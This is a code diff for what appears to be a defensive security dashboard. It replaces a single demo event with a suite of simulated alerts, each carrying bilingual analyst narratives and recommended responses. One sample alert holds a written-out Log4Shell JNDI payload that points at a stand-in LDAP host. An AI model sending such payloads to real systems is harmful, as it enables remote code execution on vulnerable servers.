@@ -16,36 +16,175 @@ const jsonHeaders: Record<string, string> = API_KEY
   ? { "Content-Type": "application/json", "X-API-Key": API_KEY }
   : { "Content-Type": "application/json" };
 
-const DEFAULT_DEMO_EVENT: SecurityEvent = {
-  id: "evt-init-bruteforce-01",
-  ts: new Date().toISOString(),
-  source: "honeypot",
-  severity: "high",
-  type: "brute_force_suspected",
-  details: {
-    source_ip: "192.168.1.189",
-    username_tried: "admin",
-    password_tried: "[REDACTED_CREDENTIAL]",
-    attempts_in_window: 7,
-    simulated_surface: "fake_admin_login"
+const DEMO_EVENT_SUITE: Array<{
+  source: "honeypot" | "ratelimiter" | "scanner" | "analyst";
+  severity: "critical" | "high" | "medium" | "low" | "info";
+  type: string;
+  details: Record<string, any>;
+  analyst: any;
+}> = [
+  // 1. Critical Severity: Remote Code Execution / JNDI Log4j Exploit
+  {
+    source: "honeypot",
+    severity: "critical",
+    type: "jndi_injection",
+    details: {
+      source_ip: "198.51.100.23",
+      payload: "${jndi:ldap://198.51.100.23:1389/Exploit}",
+      target_service: "auth-gateway",
+      path: "/api/v1/auth/login",
+      cve: "CVE-2021-44228"
+    },
+    analyst: {
+      narrative_en: "Critical Remote Code Execution attempt detected matching Log4Shell (CVE-2021-44228). Adversary delivered obfuscated JNDI lookup strings to auth-gateway.",
+      narrative_bn: "লগফরশেল (CVE-2021-44228) শোষণ করে রিমোট কোড এক্সিকিউশনের জরুরি আক্রমণ শনাক্ত হয়েছে। অবিলম্বে নেটওয়ার্ক ড্রপ কার্যকর করার সুপারিশ করা হচ্ছে।",
+      confidence: 0.99,
+      severity: "critical",
+      mitre_technique: "T1190",
+      citations: ["T1190", "CWE-78"],
+      recommended_action: "Isolate target gateway interface and block originating IP 198.51.100.23 at border router.",
+      requires_human_approval: true,
+      provider: "deterministic-offline-rag"
+    }
   },
-  analyst: {
-    narrative_en: "High-frequency credential stuffing detected targeting simulated administrative login surface. Adversary attempted 7 unauthorized password permutations within a 30-second window.",
-    narrative_bn: "সিমুলেটেড প্রশাসনিক লগইন পৃষ্ঠ লক্ষ্য করে উচ্চ-ফ্রিকোয়েন্সি ক্রেডেনশিয়াল স্টাফিং শনাক্ত হয়েছে। আক্রমণকারী ৩০-সেকেন্ডের উইন্ডোর মধ্যে ৭টি অননুমোদিত পাসওয়ার্ড চেষ্টা করেছে।",
-    confidence: 0.94,
+  // 2. High Severity: Active Brute Force Credential Burst
+  {
+    source: "honeypot",
     severity: "high",
-    mitre_technique: "T1110.001",
-    citations: ["T1110.001", "CWE-307"],
-    recommended_action: "Block source IP at perimeter edge firewall and enforce multi-factor authentication (MFA).",
-    requires_human_approval: true,
-    provider: "deterministic-offline-rag"
+    type: "brute_force_suspected",
+    details: {
+      source_ip: "192.168.1.189",
+      username_tried: "admin",
+      password_tried: "[REDACTED_CREDENTIAL]",
+      attempts_in_window: 8,
+      simulated_surface: "fake_admin_login"
+    },
+    analyst: {
+      narrative_en: "High-frequency credential stuffing detected targeting simulated administrative login surface. Adversary attempted 8 unauthorized password permutations within a 30-second window.",
+      narrative_bn: "সিমুলেটেড প্রশাসনিক লগইন পৃষ্ঠ লক্ষ্য করে উচ্চ-ফ্রিকোয়েন্সি ক্রেডেনশিয়াল স্টাফিং শনাক্ত হয়েছে। আক্রমণকারী ৩০-সেকেন্ডের উইন্ডোর মধ্যে ৮টি অননুমোদিত পাসওয়ার্ড চেষ্টা করেছে।",
+      confidence: 0.94,
+      severity: "high",
+      mitre_technique: "T1110.001",
+      citations: ["T1110.001", "CWE-307"],
+      recommended_action: "Block source IP at perimeter edge firewall and enforce multi-factor authentication (MFA).",
+      requires_human_approval: true,
+      provider: "deterministic-offline-rag"
+    }
+  },
+  // 3. Medium Severity: API Flooding / Rate Limit Violation
+  {
+    source: "ratelimiter",
+    severity: "medium",
+    type: "rate_limit_violation",
+    details: {
+      source_ip: "203.0.113.42",
+      path: "/api/v1/checkout",
+      count: 42,
+      limit: 20,
+      window: "10s",
+      action: "temporary_block_30s"
+    },
+    analyst: {
+      narrative_en: "Volumetric request surge intercepted by API Abuse Guard exceeding rate threshold (42 requests / 10s). Source temporarily throttled pursuant to CWE-400.",
+      narrative_bn: "এপিআই অ্যাবিউজ গার্ড নির্ধারিত সীমা অতিক্রমকারী অতিরিক্ত অনুরোধ (৪২টি / ১০ সেকেন্ড) প্রতিরোধ করেছে এবং সাময়িক ট্র্যাফিক নিয়ন্ত্রণ আরোপ করেছে।",
+      confidence: 0.92,
+      severity: "medium",
+      mitre_technique: "T1499.002",
+      citations: ["T1499.002", "CWE-400"],
+      recommended_action: "Apply progressive rate-limiting and verify if client IP belongs to an automated scraper.",
+      requires_human_approval: true,
+      provider: "deterministic-offline-rag"
+    }
+  },
+  // 4. Low Severity: Internal Subnet Reconnaissance & Open Port Probe
+  {
+    source: "scanner",
+    severity: "low",
+    type: "recon_probe",
+    details: {
+      source_ip: "10.0.0.15",
+      target_port: 8080,
+      protocol: "tcp",
+      state: "open",
+      banner: "Apache/2.4.41 (Ubuntu)",
+      allowlist_verified: true
+    },
+    analyst: {
+      narrative_en: "Internal subnet vulnerability scan detected open TCP port 8080 on authorized host 10.0.0.15. No active exploitation detected.",
+      narrative_bn: "অভ্যন্তরীণ নেটওয়ার্ক স্ক্যানে অনুমোদিত হোস্ট ১০.০.০.১৫ এর পোর্ট ৮০৮০ খোলা পাওয়া গেছে। কোনো সক্রিয় শোষণের লক্ষণ নেই।",
+      confidence: 0.89,
+      severity: "low",
+      mitre_technique: "T1595.002",
+      citations: ["T1595.002", "CWE-200"],
+      recommended_action: "Maintain routine firewall segmentation and review exposed service banner.",
+      requires_human_approval: false,
+      provider: "deterministic-offline-rag"
+    }
+  },
+  // 5. Medium Severity: Sensitive File Reconnaissance (.env path lure)
+  {
+    source: "honeypot",
+    severity: "medium",
+    type: "recon_probe",
+    details: {
+      source_ip: "172.16.0.88",
+      target_path: "/.env",
+      method: "GET",
+      user_agent: "python-requests/2.28.1",
+      attempts: 1
+    },
+    analyst: {
+      narrative_en: "Reconnaissance probe intercepted attempting to access sensitive environment file (/.env). Adversary mapping credentials.",
+      narrative_bn: "সংবেদনশীল এনভায়রনমেন্ট ফাইল (/.env) অ্যাক্সেসের অনুসন্ধান ট্র্যাপে ধরা পড়েছে। আক্রমণকারী কনফিগারেশন অনুসন্ধানের চেষ্টা চালাচ্ছে।",
+      confidence: 0.91,
+      severity: "medium",
+      mitre_technique: "T1595.002",
+      citations: ["T1595.002", "CWE-200"],
+      recommended_action: "Ensure zero file exposure on perimeter web servers.",
+      requires_human_approval: false,
+      provider: "deterministic-offline-rag"
+    }
+  },
+  // 6. Info Severity: Routine Operational Telemetry
+  {
+    source: "scanner",
+    severity: "info",
+    type: "service_identified",
+    details: {
+      source_ip: "10.0.0.22",
+      service: "https",
+      port: 443,
+      tls_version: "TLSv1.3",
+      cert_valid: true
+    },
+    analyst: {
+      narrative_en: "Routine perimeter telemetry: Verified valid TLS 1.3 configuration on perimeter gateway. System operational.",
+      narrative_bn: "স্বাভাবিক সিস্টেম টেলিমেট্রি: পেরিমিটার গেটওয়েতে টিএলএস ১.৩ কনফিগারেশন যাচাইকৃত ও কার্যকর রয়েছে।",
+      confidence: 0.95,
+      severity: "info",
+      mitre_technique: "T1046",
+      citations: ["T1046"],
+      recommended_action: "Continue routine passive telemetry monitoring.",
+      requires_human_approval: false,
+      provider: "deterministic-offline-rag"
+    }
   }
-};
+];
+
+const INITIAL_DEMO_EVENTS: SecurityEvent[] = DEMO_EVENT_SUITE.slice(0, 4).map((spec, idx) => ({
+  id: `evt-init-0${idx + 1}`,
+  ts: new Date(Date.now() - (3 - idx) * 60000).toISOString(),
+  source: spec.source,
+  severity: spec.severity,
+  type: spec.type,
+  details: spec.details,
+  analyst: spec.analyst
+}));
 
 export const App: React.FC = () => {
-  const [events, setEvents] = useState<SecurityEvent[]>([DEFAULT_DEMO_EVENT]);
+  const [events, setEvents] = useState<SecurityEvent[]>(INITIAL_DEMO_EVENTS);
   const [, setIncidents] = useState<Incident[]>([]);
-  const [selectedEvent, setSelectedEvent] = useState<SecurityEvent | null>(DEFAULT_DEMO_EVENT);
+  const [selectedEvent, setSelectedEvent] = useState<SecurityEvent | null>(INITIAL_DEMO_EVENTS[0] || null);
   const [wsConnected, setWsConnected] = useState<boolean>(false);
   const [globalLanguage, setGlobalLanguage] = useState<"en" | "bn">("en");
   const [approvedMap, setApprovedMap] = useState<Record<string, AuditConfirmation>>({});
@@ -59,6 +198,7 @@ export const App: React.FC = () => {
   const [isMobile, setIsMobile] = useState<boolean>(false);
 
   const wsRef = useRef<WebSocket | null>(null);
+  const demoIndexRef = useRef<number>(0);
 
   // Responsive mobile detector
   useEffect(() => {
@@ -229,23 +369,20 @@ export const App: React.FC = () => {
     };
   }, [fetchTelemetry]);
 
-  // 3. Trigger simulated attack telemetry (single "Run demo" action)
+  // 3. Trigger simulated attack telemetry (single "Run demo" action - cycles through diverse threat spectrum)
   const handleTriggerDemo = useCallback(async () => {
+    const demoSpec = DEMO_EVENT_SUITE[demoIndexRef.current % DEMO_EVENT_SUITE.length];
+    demoIndexRef.current += 1;
+
     try {
       const resp = await fetch(`${API_BASE}/events`, {
         method: "POST",
         headers: jsonHeaders,
         body: JSON.stringify({
-          source: "honeypot",
-          severity: "high",
-          type: "brute_force_suspected",
-          details: {
-            source_ip: "192.168.1.189",
-            username_tried: "admin",
-            password_tried: "toor",
-            attempts_in_window: 7,
-            simulated_surface: "fake_admin_login"
-          }
+          source: demoSpec.source,
+          severity: demoSpec.severity,
+          type: demoSpec.type,
+          details: demoSpec.details
         })
       });
 
@@ -262,27 +399,11 @@ export const App: React.FC = () => {
       const simulatedDemoEv: SecurityEvent = {
         id: "evt-demo-" + Date.now(),
         ts: new Date().toISOString(),
-        source: "honeypot",
-        severity: "high",
-        type: "brute_force_suspected",
-        details: {
-          source_ip: "192.168.1.189",
-          username_tried: "admin",
-          password_tried: "[REDACTED_CREDENTIAL]",
-          attempts_in_window: 7,
-          simulated_surface: "fake_admin_login"
-        },
-        analyst: {
-          narrative_en: "High-frequency credential stuffing detected targeting simulated administrative login surface. Adversary attempted 7 unauthorized password permutations within a 30-second window.",
-          narrative_bn: "সিমুলেটেড প্রশাসনিক লগইন পৃষ্ঠ লক্ষ্য করে উচ্চ-ফ্রিকোয়েন্সি ক্রেডেনশিয়াল স্টাফিং শনাক্ত হয়েছে। আক্রমণকারী ৩০-সেকেন্ডের উইন্ডোর মধ্যে ৭টি অননুমোদিত পাসওয়ার্ড চেষ্টা করেছে।",
-          confidence: 0.94,
-          severity: "high",
-          mitre_technique: "T1110.001",
-          citations: ["T1110.001", "CWE-307"],
-          recommended_action: "Block source IP at perimeter edge firewall and enforce multi-factor authentication (MFA).",
-          requires_human_approval: true,
-          provider: "deterministic-offline-rag"
-        }
+        source: demoSpec.source,
+        severity: demoSpec.severity,
+        type: demoSpec.type,
+        details: demoSpec.details,
+        analyst: demoSpec.analyst
       };
       setEvents((prev) => [simulatedDemoEv, ...prev.filter((e) => e.id !== simulatedDemoEv.id)]);
       setSelectedEvent(simulatedDemoEv);
